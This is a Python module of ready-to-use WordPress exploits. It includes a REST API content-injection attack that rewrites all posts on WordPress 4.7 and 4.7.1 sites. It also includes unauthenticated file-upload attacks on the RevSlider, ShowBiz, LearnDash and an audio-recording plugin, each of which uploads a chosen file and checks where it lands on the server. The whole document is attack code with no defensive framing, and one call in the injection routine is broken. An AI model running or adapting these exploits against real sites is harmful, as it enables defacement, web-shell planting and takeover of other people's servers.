#-*- coding: utf-8 -*-
import requests,json,datetime,re
          
class wp_content_injection(object):
      
      def get_version(self,target):
          self.target = target
          r = requests.get(self.target).text
          version = re.findall('ver=(.*?)"',r)
          if len(version) == 0:
             return None
          else:
             return version[0]
             
      def get_id(self,target):
          self.target = target
          content_id = []
          r = requests.get(f'{self.target}/wp/v2/posts')
          for i in r.json():
              content_id.append(i['id'])
          return content_id
          
      def post_inject(self,target,title,content_payload):
          self.target = target
          self.title = title
          self.payload = content_payload
          version = self.get_version(self.target)
          if version == '4.7' or version == '4.7.1':
             post_id = self.get_id()
             for _id in post_id:
                 r = requests.post(
                    f'{self.target}/wp/v2/posts/{str(_id)}/?id={str(_id)}',
                    data = json.dumps({
                        'title':self.title,
                        'content':self.payload
                    })
                 )
                 print(f'! Injecting Post ID : {_id}')
          else:
             print(f'[!] Wordpress version {version} Not Vulnerability')

class wp_revslider(object):

      def _wp_revslider(self,target,path_file,name_file):
          self.target = target
          self.path_file = path_file
          self.name_file = name_file
          post = requests.post(
            f'{self.target}/wp-admin/admin-ajax.php',
            data = {
                'action':'revslider_ajax_action',
                'client_action':'update_plugin'
            },
            files = {
                'update_file':(self.name_file,open(self.path_file,'r').read())
            }
          )
          post.close()
          cek = requests.get(f'{self.target}/wp-content/plugins/revslider/temp/update_extract/{self.name_file}')
          return cek.status_code,cek.url

class wp_learndash(object):

      def _wp_learndash(self,target,path_file,name_file):
          self.target = target
          self.path_file = path_file
          self.name_file = name_file
          requests.post(
            self.target,
            data = {
                'post':'foobar',
                'course_id':'foobar',
                'uploadfile':'foobar'
            },
            files = {
                'uploadfiles[]':(self.name_file,open(self.path_file,'r').read())
            }            
          )
          cek = requests.get(f"{self.target}/wp-content/uploads/assignments/{self.name_file}")
          return cek.status_code,cek.url

class wp_showbiz(object):

      def _wp_showbiz(self,target,path_file,name_file):
          self.target = target
          self.path_file = path_file
          self.name_file = name_file
          requests.post(
            f'{self.target}/wp-admin/admin-ajax.php',
            data = {
                'action':'showbiz_ajax_action',
                'client_action':'update_plugin'                
            },
            files = {
                'update_file':(self.name_file,open(self.path_file,"r").read(),'text/html')
            }
          )
          cek = requests.get(f"{self.target}/wp-content/plugins/showbiz/temp/update_extract/{self.name_file}")
          return cek.status_code,cek.url

class wp_audio_control(object):

      def _wp_audio_control(self,target,path_file,name_file):
          self.target = target
          self.path_file = path_file
          self.name_file = name_file
          requests.post(
            f'{self.target}/wp-admin/admin-ajax.php',
            data = {
                'audio-filename':self.name_file,
                'action':'save_record',
                'course_id':'undefined',
                'unit_id':'undefined'
            },
            files = {
                'audio-blob':(
                    'blob',open(self.path_file,'r').read()
                )
            }
          )
          cek = requests.get(f'{self.target}/wp-content/uploads/{datetime.datetime.now().year}/{datetime.datetime.now().month:02}/{self.name_file}')
          return cek.status_code,cek.url      